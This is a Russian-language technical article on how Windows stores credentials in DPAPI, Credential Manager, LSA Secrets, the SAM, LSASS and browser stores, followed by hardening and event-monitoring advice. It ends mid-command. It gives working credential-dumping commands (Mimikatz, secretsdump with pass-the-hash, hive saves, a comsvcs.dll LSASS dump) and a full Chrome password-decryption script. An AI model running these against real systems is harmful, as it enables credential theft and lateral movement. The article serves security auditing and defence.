---
title: "Windows - Credential Manager и LSA Secrets"
date: "2026-05-15"
---

Windows хранит credentials в нескольких местах: Credential Manager (для пользовательских паролей), LSA Secrets (для системных секретов и сервисных аккаунтов), SAM (для локальных аккаунтов), LSASS (в оперативной памяти). Понимание где что хранится, как зашифровано и как это извлекается - основа как для защиты, так и для аудита безопасности.

---

## Карта хранилищ credentials

```
Где Windows хранит секреты:

LSASS (память)
├── NT Hashes активных пользователей
├── Kerberos TGT и TGS тикеты
├── Kerberos ключи сессий (AES/RC4)
├── Plaintext пароли (WDigest, если включён)
└── DPAPI мастер-ключи сессии

SAM (реестр: HKLM\SAM)
├── NT Hashes локальных пользователей
└── LM Hashes (если не отключены)

LSASS Secrets / LSA Secrets (реестр: HKLM\SECURITY)
├── Пароли сервисных аккаунтов (Services: раздел)
├── Cached Domain Credentials (NL$KM ключ + DCC2 хеши)
├── DPAPI System мастер-ключ (DPAPI_SYSTEM)
├── Пароль Machine аккаунта (машины в домене)
└── SCM secrets и другие системные секреты

Credential Manager (файловая система)
├── Windows Credentials
│   ├── Сетевые credentials (шары, серверы)
│   └── Сертификаты
└── Generic Credentials
    ├── Пользовательские приложения (Teams, GitHub, VS Code)
    └── Сохранённые пароли браузеров (Internet Explorer/Edge legacy)

Браузеры (отдельное хранилище)
├── Chrome: SQLite + DPAPI (Local State + Login Data)
├── Edge: аналогично Chrome
├── Firefox: NSS key store (key4.db + logins.json)
└── Internet Explorer: CryptProtectData в реестре

Диспетчер учётных данных (Vault)
├── %USERPROFILE%\AppData\Roaming\Microsoft\Credentials\
├── %USERPROFILE%\AppData\Local\Microsoft\Credentials\
└── %SYSTEMROOT%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
```

---

## DPAPI - фундамент шифрования

```
DPAPI (Data Protection API) - криптографическая подсистема Windows,
на которой основана защита большинства хранилищ credentials.
Не нужно реализовывать криптографию самому - вызываешь CryptProtectData()
и Windows сама шифрует данные, привязывая их к аккаунту пользователя.

Иерархия ключей DPAPI:

User password
    ↓ PBKDF2 / SHA1
User SID + Prekey
    ↓ 
Master Key (256 бит, живёт 90 дней)
    ↓ хранится в %APPDATA%\Microsoft\Protect\<SID>\
    ↓ зашифрован SHA1(password + SID)
    ↓
Encryption Key (сессионный, для конкретного Blob)
    ↓
Encrypted Blob (CryptProtectData output)

Где хранятся Master Keys:
Пользователя: %USERPROFILE%\AppData\Roaming\Microsoft\Protect\<SID>\
              (файлы с именами вида {GUID})
Системный:    %WINDIR%\System32\Microsoft\Protect\S-1-5-18\User\
              HKLM\SECURITY\Policy\Secrets\DPAPI_SYSTEM (LSA Secret)

Master Key файл:
  Зашифрован: SHA1(user_password + user_SID) → AES256 / 3DES
  Резервная копия: на DC в AD (атрибут msKds-KeyVersion)

Как работает шифрование данных:
  1. Приложение вызывает CryptProtectData(plaintext, entropy, ...)
  2. DPAPI берёт текущий Master Key (расшифровывает его паролем)
  3. Генерирует сессионный ключ
  4. Шифрует данные сессионным ключом
  5. Возвращает Blob: {GUID мастер-ключа} + {зашифрованные данные}

Как работает расшифровка:
  1. Приложение вызывает CryptUnprotectData(blob)
  2. DPAPI читает GUID мастер-ключа из Blob
  3. Открывает нужный Master Key файл
  4. Расшифровывает мастер-ключ паролем пользователя (уже в памяти)
  5. Расшифровывает данные
  6. Возвращает plaintext

Критичное следствие:
  Если злоумышленник имеет Master Key (и/или пароль пользователя) -
  он может расшифровать ВСЕ DPAPI-защищённые данные этого пользователя:
  Credential Manager, браузерные пароли, сертификаты, ключи WiFi и т.д.
```

### DPAPI Backup через DC

```
В доменной среде Master Keys бэкапируются на DC.
Это позволяет восстановить credentials при смене пароля.

Механизм (Domain Backup Key):
  При первом использовании DPAPI в домене генерируется
  Domain DPAPI Backup Key (RSA-2048) и хранится в AD.
  
  Каждый Master Key зашифрован ещё и Domain Backup Key.
  Если пользователь сменил пароль - Master Key можно расшифровать
  через Domain Backup Key (хранится в HKLM\SECURITY\Policy\Secrets\G$BCKUPKEY_*)

  Это значит: контролируя DC, можно расшифровать DPAPI данные ЛЮБОГО пользователя домена.
  Инструмент: Mimikatz → lsadump::backupkeys / dpapi::masterkey /rpc

Извлечь Domain Backup Key (требует DA или SYSTEM на DC):
  mimikatz# lsadump::backupkeys /system:dc01.contoso.com /export

  # Затем расшифровать мастер-ключ любого пользователя:
  mimikatz# dpapi::masterkey /in:"{GUID}" /pvk:ntds_capi_0_backup.pvk
```

---

## Credential Manager

### Архитектура и типы

```
Credential Manager - пользовательское хранилище credentials Windows.
GUI: Control Panel → Credential Manager (или: rundll32.exe keymgr.dll, KRShowKeyMgr)
PowerShell: нет встроенного модуля (используется .NET или cmdkey.exe)

Три категории:

Windows Credentials (Windows-учётные данные):
  - NTLM/Kerberos credentials для сетевых ресурсов
  - Сохранённые пароли для серверов, доменов, шар
  - Целевой формат: MicrosoftOffice*, MicrosoftSkype*, \\server\share и т.д.
  - Хранятся как Windows Vault entries
  - Зашифрованы: CryptProtectData (DPAPI пользователя)

Certificate-Based Credentials:
  - Клиентские сертификаты для аутентификации
  - Редко используются напрямую пользователями

Generic Credentials (Общие учётные данные):
  - Credentials для приложений (не Windows-протоколы)
  - Примеры: GitHub Desktop, Teams, Visual Studio, Edge
  - Формат: произвольный (зависит от приложения)
  - Зашифрованы: CryptProtectData (DPAPI пользователя)

Физическое расположение Vault файлов:
  %USERPROFILE%\AppData\Roaming\Microsoft\Credentials\
  %USERPROFILE%\AppData\Local\Microsoft\Credentials\
  C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
  C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials\

Формат файла:
  Бинарный формат VAULT (Credential Vault Entry)
  Заголовок с GUID мастер-ключа + зашифрованный payload
  Нельзя прочитать обычным текстовым редактором
```

### Управление через cmdkey.exe

```
cmdkey - встроенный инструмент для управления Credential Manager из командной строки.

Просмотр сохранённых credentials:
  cmdkey /list
  cmdkey /list:targetname     # фильтр по имени цели

  Пример вывода:
    Currently stored credentials:

    Target: Domain:interactive=CONTOSO\alice
    Type: Domain Password
    User: CONTOSO\alice

    Target: MicrosoftOffice16_Data:SSPI:user@contoso.com
    Type: Generic
    User: user@contoso.com

Добавить credentials:
  cmdkey /add:servername /user:DOMAIN\username /pass:password
  cmdkey /add:192.168.1.10 /user:Administrator /pass:P@ssw0rd

  # Для Generic (приложения):
  cmdkey /generic:targetname /user:username /pass:password

  # Для доменной аутентификации:
  cmdkey /add:domain.com /user:DOMAIN\user /pass:password

Удалить credentials:
  cmdkey /delete:servername
  cmdkey /delete:MicrosoftOffice16_Data:SSPI:user@contoso.com

Практический сценарий - runas с сохранёнными credentials:
  cmdkey /add:server01 /user:DOMAIN\admin /pass:AdminP@ss
  runas /user:DOMAIN\admin /savecred "notepad.exe"
  # После первого ввода пароля /savecred сохраняет в Credential Manager
```

### Управление через PowerShell (.NET)

```
PowerShell не имеет нативных cmdlet для Credential Manager,
но можно использовать Win32 API через P/Invoke или сторонние модули.

Вариант 1: Модуль CredentialManager (из PSGallery):
  Install-Module -Name CredentialManager -Force

  # Получить все credentials
  Get-StoredCredential | Select-Object TargetName, Type, UserName

  # Получить credentials для конкретного таргета (включая пароль)
  $cred = Get-StoredCredential -Target "servername" -AsCredentialObject
  $cred.GetNetworkCredential().Password

  # Сохранить credentials
  New-StoredCredential -Target "servername" -UserName "user" -Password "pass" -Type Generic

  # Удалить
  Remove-StoredCredential -Target "servername"

Вариант 2: Напрямую через Windows API (P/Invoke):
  $code = @"
  using System;
  using System.Runtime.InteropServices;
  using System.Text;

  public class CredManager {
      [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
      static extern bool CredRead(string target, CRED_TYPE type, int reservedFlag, out IntPtr credentialPtr);

      [DllImport("advapi32.dll")]
      static extern void CredFree(IntPtr buffer);

      [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
      struct CREDENTIAL {
          public uint Flags;
          public CRED_TYPE Type;
          public string TargetName;
          public string Comment;
          public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
          public uint CredentialBlobSize;
          public IntPtr CredentialBlob;
          public uint Persist;
          public uint AttributeCount;
          public IntPtr Attributes;
          public string TargetAlias;
          public string UserName;
      }

      public enum CRED_TYPE : uint {
          Generic = 1,
          DomainPassword = 2,
          DomainCertificate = 3,
      }

      public static string GetPassword(string target) {
          IntPtr credPtr;
          if (CredRead(target, CRED_TYPE.Generic, 0, out credPtr)) {
              var cred = Marshal.PtrToStructure<CREDENTIAL>(credPtr);
              var password = Marshal.PtrToStringUni(cred.CredentialBlob, (int)cred.CredentialBlobSize / 2);
              CredFree(credPtr);
              return password;
          }
          return null;
      }
  }
  "@
  Add-Type -TypeDefinition $code
  [CredManager]::GetPassword("targetname")

Вариант 3: Утилита вокруг vaultcmd.exe:
  # vaultcmd - встроен в Windows, работает с Vault
  vaultcmd /listschema          # схемы хранилищ
  vaultcmd /list                # список хранилищ
  vaultcmd /listcreds:"Windows Credentials"   # содержимое
```

### Автологон (AutoLogon) и Credential Manager

```
Windows AutoLogon хранит credentials в реестре (не в Credential Manager):
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
    DefaultUserName      = имя пользователя
    DefaultPassword      = пароль (plaintext!)
    AutoAdminLogon       = 1 (включён)
    DefaultDomainName    = имя домена

Эти данные НЕ зашифрованы - хранятся в открытом виде!
Любой локальный администратор может их прочитать.

Проверить:
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
    Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon

Безопасная альтернатива:
  Sysinternals AutoLogon.exe - шифрует пароль через DPAPI (всё равно уязвимо при SYSTEM).
  Лучше не использовать AutoLogon на рабочих станциях в домене.
```

---

## LSA Secrets

### Что такое LSA Secrets

```
LSA Secrets - защищённое хранилище в ядре Windows для системных секретов.
Управляется LSA (Local Security Authority) через lsasrv.dll.
Недоступно для пользователей и большинства приложений.
Требует SYSTEM права для чтения (не Administrator, а именно SYSTEM).

Физическое расположение:
  Реестр: HKLM\SECURITY\Policy\Secrets\
  Этот раздел недоступен даже для Administrator напрямую:
    reg query HKLM\SECURITY  → "Access Denied"
    Права на ключ: только SYSTEM имеет Full Control

Структура раздела (HKLM\SECURITY\Policy\Secrets\):
  <SecretName>\
      CurrVal    - текущее зашифрованное значение
      OldVal     - предыдущее зашифрованное значение
      CupdTime   - время последнего обновления
      OupdTime   - время предыдущего обновления

Шифрование LSA Secrets:
  Vista и ранее: RC4 с ключом из SYSTEM бутстрап-ключа
  Windows 7+:    AES-256 в CBC режиме
  
  Ключи шифрования:
    HKLM\SECURITY\Policy\PolEKList  - LSA шифровальный ключ
    Этот ключ зашифрован Boot Key (Syskey)
    Boot Key извлекается из четырёх разделов SAM:
      HKLM\SYSTEM\CurrentControlSet\Control\Lsa\
        JD, Skew1, GBG, Data  (по 4 байта каждый, скрамблированы)
```

### Что хранится в LSA Secrets

```
Список стандартных секретов:

$MACHINE.ACC
  - Пароль Machine Account (компьютерной учётной записи в домене)
  - Обновляется каждые 30 дней автоматически
  - Используется для аутентификации компьютера в домене (Kerberos + NTLM)
  - NT Hash пароля = NT Hash машины = используется для Pass-the-Hash машины

_SC_<ServiceName>
  - Пароль сервисного аккаунта для каждого сервиса
  - Формат: _SC_wuauserv, _SC_MSSQLServer, _SC_Spooler и т.д.
  - Если сервис настроен на "Этот аккаунт" вместо Local System
  - Plaintext пароль сервисного аккаунта!

DefaultPassword
  - Пароль AutoLogon (если настроен через LSA Secrets, а не реестр)
  - Plaintext

NL$KM
  - Ключ шифрования Cached Domain Credentials (DCC/MSCache)
  - Используется для шифрования кэшированных хешей входа
  - При захвате позволяет расшифровать все кэшированные credentials

DPAPI_SYSTEM
  - Системный DPAPI Master Key
  - Используется для расшифровки DPAPI данных системных аккаунтов
  - (Local System, Local Service, Network Service)

G$BCKUPKEY_<GUID>
  - Domain DPAPI Backup Key (только на DC)
  - RSA приватный ключ для восстановления DPAPI данных любого пользователя домена
  - Самый ценный секрет на DC!

RasDialParams и RasCredentials
  - Credentials для VPN/RAS соединений (если настроены в системе)

SCM:{<GUID>}
  - Дополнительные секреты Service Control Manager

L$<name>
  - Произвольные LSA секреты приложений (некоторые приложения хранят здесь)
```

### Как извлечь LSA Secrets

```
Для извлечения нужны SYSTEM права (не просто Administrator).
Способы получить SYSTEM: PsExec -s, Invoke-Command от scheduled task, или уже быть системой.

Метод 1: Через реестровые кусты (оффлайн)
  Требует: физический доступ или бэкап (теневая копия)
  
  Скопировать нужные кусты (нельзя просто скопировать файл пока система работает):
    reg save HKLM\SECURITY security.hive
    reg save HKLM\SYSTEM system.hive
    reg save HKLM\SAM sam.hive

  Извлечь из оффлайн кустов (например через impacket):
    secretsdump.py -system system.hive -security security.hive -sam sam.hive LOCAL

Метод 2: Через Volume Shadow Copy (онлайн, без остановки системы)
  Создать теневую копию (если нет готовой):
    vssadmin list shadows             # проверить существующие
    wmic shadowcopy call create Volume="C:\"   # создать

  Скопировать файлы из тени:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY .
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .

Метод 3: Mimikatz (онлайн, нужен SYSTEM или SeDebugPrivilege)
  Запустить mimikatz от SYSTEM:
    PsExec64.exe -s mimikatz.exe

  В mimikatz:
    mimikatz# privilege::debug
    mimikatz# token::elevate        # получить SYSTEM токен
    mimikatz# lsadump::secrets      # дамп LSA Secrets
    mimikatz# lsadump::sam          # дамп SAM хешей
    mimikatz# lsadump::cache        # дамп кэшированных credentials

Метод 4: Impacket (удалённо, если есть Admin credentials)
  secretsdump.py DOMAIN/Administrator:P@ssword@TARGET
  secretsdump.py -hashes :NTHash DOMAIN/Administrator@TARGET   # Pass-the-Hash

  Что получим:
    [*] Service RemoteRegistry is in stopped state
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC
    CONTOSO\WORKSTATION01$:aes256-cts-hmac-sha1-96:abcdef...
    CONTOSO\WORKSTATION01$:aes128-cts-hmac-sha1-96:...
    CONTOSO\WORKSTATION01$:des-cbc-md5:...
    CONTOSO\WORKSTATION01$:plain_password_hex:...
    [*] DefaultPassword
    (null)
    [*] NL$KM
    NL$KM:hex...
```

---

## Cached Domain Credentials (DCC / MSCache)

```
DCC (Domain Cached Credentials, также MSCache или Domain Cached Logon) -
механизм кэширования credentials доменных пользователей на локальной машине.

Зачем нужен кэш:
  Если DC недоступен (отключён от сети, ноутбук в командировке) -
  пользователь всё равно может войти, используя кэшированные credentials.

Где хранится:
  Реестр: HKLM\SECURITY\Cache\
          (недоступен для Administrator, только SYSTEM)
  Значения: NL$1, NL$2, ..., NL$10  (по умолчанию 10 записей)

Алгоритм хеширования DCC:
  MSCacheV1 (Windows 2000 - XP):
    DCC = MD4(MD4(UTF-16LE(password)) + UTF-16LE(lowercase(username)))
    
  MSCacheV2 / DCC2 (Vista и новее):
    DCC2 = PBKDF2(HMAC-SHA1, MSCacheV1, username, 10240 iterations)
    
  Ключевое отличие DCC2 от NT Hash:
    10240 итераций → взлом в 10000+ раз медленнее чем NT Hash
    Практическая скорость GPU (RTX 3090): ~200 млн/сек vs 70 млрд/сек для NT Hash

Формат записи в кэше:
  Зашифровано: AES-256 с ключом NL$KM (LSA Secret)
  После расшифровки: {DCC2 hash}{username}{domain}{...metadata}

Настройка количества кэшированных записей:
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
    CachedLogonsCount = 10  (по умолчанию)

  # Отключить кэш (значение 0):
  Set-ItemProperty `
      -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" `
      -Name "CachedLogonsCount" `
      -Value "0"

  # Через GPO:
  Computer Config → Windows Settings → Security Settings → Local Policies → Security Options
  "Interactive logon: Number of previous logons to cache" = 0
  (Риск: если DC недоступен - пользователи не смогут войти)

Атака на кэш:
  1. Извлечь зашифрованный кэш + NL$KM через LSA Secrets дамп
  2. Расшифровать с NL$KM → получить DCC2 хеши
  3. Взламывать DCC2 словарными/brute-force атаками
  4. DCC2 нельзя использовать напрямую как Pass-the-Hash!
     (только пароль или NT Hash нужен для PtH)

Формат для hashcat (mode 2100):
  $DCC2$10240#username#hash
```

---

## SAM - Security Account Manager

```
SAM - база данных локальных пользователей Windows.
Физический файл: C:\Windows\System32\config\SAM
Реестровый куст: HKLM\SAM

Содержит:
  - NT Hashes локальных пользователей
  - LM Hashes (если не отключены через NoLMHash)
  - Метаданные аккаунтов (флаги, последний вход и т.д.)
  - Пароли не хранятся в plaintext - только хеши

Шифрование SAM:
  До Vista: ROT-13 / DES (слабо)
  Vista+:   AES-128 с ключом из SYSKEY (Boot Key)
  
  SYSKEY (System Key) - 128-битный ключ, хранится в четырёх разделах реестра:
    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\
      JD, Skew1, GBG, Data
    (каждый содержит часть ключа, скрамблированного определённым образом)

Почему нельзя просто скопировать SAM файл:
  Файл заблокирован системой пока Windows работает
  Решение: Volume Shadow Copy или оффлайн доступ (WinPE, другая ОС)

Дамп SAM через реестр (нужен SYSTEM):
  reg save HKLM\SAM C:\Temp\sam.hive
  reg save HKLM\SYSTEM C:\Temp\system.hive
  
  # Затем оффлайн:
  impacket-secretsdump -system system.hive -sam sam.hive LOCAL
  # Или: Mimikatz: lsadump::sam

Результат дампа:
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
  Формат: username:RID:LM_hash:NT_hash:::
  
  aad3b435b51404eeaad3b435b51404ee = LM hash пустого пароля (LM отключён)
  8846f7eaee8fb117ad06bdd830b7586c = NT hash слова "password"

RID (Relative Identifier) в SAM:
  500 = Administrator (встроенный, нельзя удалить)
  501 = Guest
  503 = DefaultAccount
  1000+ = созданные пользователи
```

---

## LSASS - credentials в памяти

```
LSASS (Local Security Authority Subsystem Service) - процесс lsass.exe.
Хранит в памяти credentials АКТИВНЫХ (вошедших) пользователей.

Что хранит LSASS:
  NT Hash (всегда)
  Kerberos TGT и сессионные ключи
  Kerberos TGS тикеты (для каждого сервиса)
  Plaintext пароли через WDigest (если включён)
  DPAPI мастер-ключи (для расшифровки DPAPI данных)
  NTLM challenge-response keys

WDigest (устаревший протокол):
  В Windows XP - 8.1: хранил plaintext пароли в LSASS для HTTP Digest аутентификации
  
  По умолчанию:
    Windows 8.1 / 2012 R2+: WDigest отключён (не хранит plaintext)
    Windows 7 / 2008 R2 и старше: WDigest включён!
  
  Включить/выключить WDigest:
    # Выключить (не хранить plaintext):
    Set-ItemProperty `
        -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "UseLogonCredential" -Value 0
    
    # Включить (внимание: НЕБЕЗОПАСНО):
    Set-ItemProperty `
        -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "UseLogonCredential" -Value 1
    
    # Требует повторного входа пользователя для эффекта

Дамп LSASS памяти:
  Метод 1: Task Manager (GUI)
    Details → lsass.exe → правый клик → Create Dump File
    (создаёт minidump в %TEMP%, требует Administrator)

  Метод 2: comsvcs.dll (LOLBin - Living Off the Land)
    # Через rundll32 (обходит некоторые AV)
    # Нужен SYSTEM или SeDebugPrivilege
    $lsassPID = (Get-Process lsass).Id
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\Temp\lsass.dmp full

  Метод 3: procdump.exe (Sysinternals)
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    procdump.exe -accepteula -ma -64 lsass.exe lsass.dmp  # для x64

  Метод 4: ProcExp (Process Explorer Sysinternals)
    Правый клик на lsass.exe → Create Dump → Mini Dump

  Разбор дампа с Mimikatz:
    mimikatz# sekurlsa::minidump lsass.dmp
    mimikatz# sekurlsa::logonpasswords    # показать credentials
    mimikatz# sekurlsa::wdigest           # WDigest (plaintext)
    mimikatz# sekurlsa::kerberos          # Kerberos TGT/TGS
    mimikatz# sekurlsa::dpapi             # DPAPI мастер-ключи

  Разбор дампа с pypykatz (Python, Linux):
    pypykatz lsa minidump lsass.dmp
```

### Защита LSASS

```
1. Credential Guard (лучшая защита)
   Переносит credentials в Isolated LSA (LSAIso) - виртуальную машину на базе Hyper-V.
   Даже компрометированное ядро не может читать из LSAIso.
   
   Требования: UEFI Secure Boot, TPM, Intel VT-x / AMD-V, Windows 10+ Enterprise
   
   Включить через GPO:
     Computer Config → Admin Templates → System → Device Guard
     "Turn on Virtualization Based Security" = Enabled
     "Credential Guard Configuration" = Enabled with UEFI lock
   
   Включить через реестр:
     New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
         -Name "EnableVirtualizationBasedSecurity" -Value 1 -PropertyType DWORD
     New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
         -Name "LsaCfgFlags" -Value 1 -PropertyType DWORD
     # 1 = включить с UEFI lock, 2 = включить без lock

2. PPL (Protected Process Light) для LSASS
   LSASS запускается как Protected Process Light - другие процессы не могут
   делать ReadProcessMemory даже с SeDebugPrivilege.
   
   Включить:
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
         -Name "RunAsPPL" -Value 1 -PropertyType DWORD
     # Требует перезагрузку
     # Требует Secure Boot (иначе можно отключить через реестр)
   
   Проверить:
     Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" RunAsPPL
     # 1 = включён, ключ должен быть защищён UEFI переменными

3. Windows Defender Credential Guard (статус)
   msinfo32.exe → "Virtualization-based security"
   "Services Running" должно содержать "Credential Guard"

4. Ограничить SeDebugPrivilege
   По умолчанию только Administrator имеет SeDebugPrivilege в elevated сессии.
   Убрать эту привилегию даже у Administrator (очень строго, может ломать инструменты):
     GPO: Computer Config → Windows Settings → Security Settings
     → Local Policies → User Rights Assignment
     → Debug programs - убрать Administrators

5. Windows Defender Attack Surface Reduction (ASR)
   Правило: "Block credential stealing from the Windows local security authority subsystem"
   GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0
   
   PowerShell:
     Add-MpPreference -AttackSurfaceReductionRules_Ids `
         "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0" `
         -AttackSurfaceReductionRules_Actions Enabled
```

---

## Браузерные credentials

### Chrome / Edge (Chromium)

```
Chrome хранит пароли в SQLite базе, зашифрованной DPAPI.

Расположение файлов:
  Chromium пароли: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
  Edge пароли:     %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
  Ключ шифрования: %LOCALAPPDATA%\Google\Chrome\User Data\Local State

Структура шифрования (Chrome v80+):
  AES-256-GCM с ключом, который хранится в Local State (JSON):
    "os_crypt": { "encrypted_key": "<base64>" }
  Сам encrypted_key = DPAPI(DPAPIPREFIX + AES_key)
  
  Алгоритм расшифровки:
    1. Взять encrypted_key из Local State
    2. Base64-decode → убрать префикс "DPAPI" (5 байт)
    3. CryptUnprotectData → получить AES-ключ
    4. Открыть Login Data (SQLite): SELECT origin_url, username_value, password_value FROM logins
    5. password_value = "v10" + nonce(12 bytes) + ciphertext + tag(16 bytes)
    6. AES-256-GCM decrypt(key, nonce, ciphertext) → plaintext пароль

Скрипт расшифровки (Python):
  import sqlite3, json, base64, win32crypt
  from Crypto.Cipher import AES
  import shutil, os

  def get_chrome_key():
      local_state_path = os.path.join(os.environ['LOCALAPPDATA'],
          r'Google\Chrome\User Data\Local State')
      with open(local_state_path, 'r', encoding='utf-8') as f:
          local_state = json.load(f)
      encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
      encrypted_key = encrypted_key[5:]  # убрать DPAPI префикс
      return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

  def decrypt_password(ciphertext, key):
      try:
          nonce = ciphertext[3:15]
          ciphertext_body = ciphertext[15:]
          cipher = AES.new(key, AES.MODE_GCM, nonce)
          return cipher.decrypt(ciphertext_body)[:-16].decode('utf-8')
      except:
          return ""

  def get_chrome_passwords():
      key = get_chrome_key()
      db_path = os.path.join(os.environ['LOCALAPPDATA'],
          r'Google\Chrome\User Data\Default\Login Data')
      tmp_db = os.path.join(os.environ['TEMP'], 'tmp_login_data')
      shutil.copy2(db_path, tmp_db)  # копировать т.к. Chrome блокирует файл
      
      conn = sqlite3.connect(tmp_db)
      cursor = conn.cursor()
      cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
      
      for url, username, encrypted_pw in cursor.fetchall():
          pw = decrypt_password(encrypted_pw, key)
          if pw:
              print(f"URL: {url} | User: {username} | Pass: {pw}")
      conn.close()
      os.remove(tmp_db)

  get_chrome_passwords()
```

### Firefox

```
Firefox использует собственный NSS (Network Security Services) хранилище.

Файлы профиля:
  %APPDATA%\Mozilla\Firefox\Profiles\<profile>\
    key4.db     - NSS база данных ключей (SQLite, SQLCipher)
    logins.json - зашифрованные credentials
    cert9.db    - сертификаты

Структура шифрования:
  Мастер-пароль (если установлен) → PBKDF2 → ключ для NSS
  Без мастер-пароля: используется пустая строка → слабая защита
  
  logins.json содержит:
    encryptedUsername: base64(ASN1(SEC_PKCS7_ENVELOPE(username)))
    encryptedPassword: аналогично
    
  Шифрование: 3DES-CBC (через NSS PKCS#7 envelope)

Мастер-пароль Firefox = единственная реальная защита.
Без него все сохранённые пароли уязвимы.

Инструменты:
  firefox_decrypt (Python): python firefox_decrypt.py /path/to/profile
  firepwd.py: работает с key4.db и logins.json
```

---

## Защита credentials - рекомендации

### Технические меры

```
Уровень 1: Базовый (обязательно)

  Отключить WDigest:
    Set-ItemProperty "HKLM:\SYSTEM\...\WDigest" UseLogonCredential 0

  Включить PPL для LSASS:
    Set-ItemProperty "HKLM:\SYSTEM\...\Lsa" RunAsPPL 1

  Отключить кэш credentials (если DC всегда доступен):
    Set-ItemProperty "HKLM:\SOFTWARE\...\Winlogon" CachedLogonsCount 0

  Включить SMB Signing:
    Set-ItemProperty "HKLM:\SYSTEM\...\LanmanServer\Parameters" RequireSecuritySignature 1

  Убрать AutoLogon:
    Remove-ItemProperty "HKLM:\SOFTWARE\...\Winlogon" DefaultPassword (если есть)

Уровень 2: Продвинутый

  Credential Guard:
    Требует UEFI + TPM + Enterprise лицензия
    Изолирует LSASS в Hyper-V контейнер

  Protected Users Security Group:
    Для всех привилегированных аккаунтов (Domain Admins, Schema Admins и т.д.)
    Запрещает NTLM, кэширование, делегирование

  LAPS (Local Administrator Password Solution):
    Уникальные пароли локальных admin на каждой машине
    Исключает lateral movement через локальный admin

  ASR правило против дампа LSASS:
    GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0

Уровень 3: Максимальный

  Privileged Access Workstations (PAW):
    Отдельные машины только для административных задач

  Just-In-Time (JIT) доступ:
    Привилегии выдаются на время (Microsoft PAM / CyberArk)

  Tiered Administration Model:
    Tier 0: DC / PKI / Identity (только с Tier 0 машин)
    Tier 1: Серверы (только с Tier 1 машин)
    Tier 2: Рабочие станции (только с Tier 2 машин)

  Gated / Smart Card аутентификация:
    Hardware token для всех привилегированных входов
```

### Аудит и мониторинг

```
Ключевые Event ID для мониторинга credentials:

  4624 - Успешный вход в систему
    Тип 2 = интерактивный (физический вход)
    Тип 3 = сетевой (SMB, WinRM)
    Тип 4 = batch (scheduled task)
    Тип 5 = service (сервисный аккаунт)
    Тип 7 = unlock (разблокировка экрана)
    Тип 8 = NetworkCleartext (WDigest, BasicAuth)
    Тип 9 = NewCredentials (runas /netonly)
    Тип 10 = RemoteInteractive (RDP)

  4625 - Неудачный вход
    Status/SubStatus коды:
    0xC000006D - неверный username или auth protocol
    0xC000006A - неверный пароль
    0xC0000064 - username не существует
    0xC000006F - вход не разрешён в это время
    0xC0000070 - вход с этой workstation запрещён

  4648 - Вход с явными credentials (runas, runas /netonly)
  4672 - Специальные привилегии при входе (SeDebugPrivilege и т.д.)
  4720 - Создание пользователя
  4732 - Добавление в группу Administrators
  4776 - NTLM Credential Validation (на DC)
  4768 - Запрос TGT (Kerberos AS-REQ)
  4769 - Запрос TGS (Kerberos TGS-REQ)

  LSASS-специфичные:
  10 (Sysmon) - ProcessAccess (обращение к lsass.exe)
  Sysmon EventID 10 с TargetImage=lsass.exe = попытка дампа!

PowerShell для мониторинга:
  # Найти подозрительные обращения к LSASS (Sysmon)
  Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
      Where-Object { $_.Id -eq 10 -and $_.Message -match "lsass" } |
      Select-Object TimeCreated, Message | Format-List

  # Найти входы с явными credentials (runas)
  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4648} -MaxEvents 100 |
      Select-Object TimeCreated,
      @{N="TargetUser"; E={$_.Properties[5].Value}},
      @{N="TargetServer"; E={$_.Properties[8].Value}} |
      Format-Table -AutoSize

  # Подозрительные WDigest входы (тип 8)
  Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
      Where-Object { $_.Properties[8].Value -eq 8 } |
